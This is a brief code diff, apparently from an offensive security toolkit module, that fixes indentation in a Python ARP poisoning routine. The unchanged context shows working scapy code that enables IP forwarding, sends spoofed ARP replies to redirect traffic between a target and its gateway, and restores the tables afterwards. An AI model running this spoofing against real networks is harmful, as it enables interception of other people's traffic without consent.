@@ -53,7 +53,7 @@ class Module:
 		def poison_target(gatway_ip,gatway_mac,target_ip,target_mac):
 		  self.printLine('[+] Start Poisoning',bcolors.OKGREEN)
 			with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-		        	ipf.write('1\n')
+				ipf.write('1\n')
 			while True:
 				try:
 					send(ARP(op=2,psrc=gatway_ip,pdst=target_ip,hwdst=target_mac))
@@ -66,7 +66,7 @@ class Module:
 		    	send(ARP(op=2, pdst=gatway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=3)
 		    	send(ARP(op=2, pdst=target_ip, psrc=gatway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatway_mac), count=3)
 			with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-		        	ipf.write('0\n')
+				ipf.write('0\n')
 			os._exit(0)
 		def get_mac(ip_address):
 			ans,unasn = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
